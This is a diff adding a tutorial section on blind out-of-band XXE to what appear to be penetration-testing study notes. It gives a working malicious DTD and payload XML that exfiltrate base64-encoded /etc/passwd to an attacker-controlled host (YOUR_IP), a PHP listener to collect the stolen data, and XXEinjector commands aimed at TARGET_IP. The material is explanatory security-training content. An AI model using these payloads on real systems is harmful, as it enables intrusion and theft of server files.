@@ -988,3 +988,100 @@ python3 -m http.server 8000
 * Result: Error includes the contents of `/etc/hosts` in the path.
 
 ---
+
+# 🕵️‍♂️ Blind Data Exfiltration (XXE)
+
+## 📌 Problem
+
+In fully **blind XXE** situations:
+
+* No output of XML input/entities is returned.
+* No runtime or parsing errors are shown.
+* Traditional and error-based XXE methods fail.
+
+## 🌐 Out-of-Band (OOB) XXE
+
+### 🧠 Concept
+
+* Use the web server to make a **network request** to your server containing the **file content**.
+* Works even when **nothing is shown** in response.
+
+### 🔧 Manual Method – HTTP OOB with Base64
+
+#### 1. **DTD File** (`xxe.dtd`)
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
+```
+
+#### 2. **PHP Server (listener)**
+
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+```
+
+```bash
+$ php -S 0.0.0.0:8000
+```
+
+#### 3. **Payload XML**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+#### ✅ Result
+
+* Target server sends file content to your server as a **GET request**.
+* You decode the Base64 string to see file contents.
+
+## 🤖 Automated Tool: **XXEinjector**
+
+### 🔗 Install
+
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+
+### ✍️ Create Request File (`/tmp/xxe.req`)
+
+Only include XML header + marker:
+
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: TARGET_IP
+...
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+### 🚀 Run the Tool
+
+```bash
+ruby XXEinjector.rb \
+  --host=YOUR_IP \
+  --httpport=8000 \
+  --file=/tmp/xxe.req \
+  --path=/etc/passwd \
+  --oob=http \
+  --phpfilter
+```
+
+### 📁 Retrieve Logs
+
+```bash
+cat Logs/TARGET_IP/etc/passwd.log
+```
+
+---
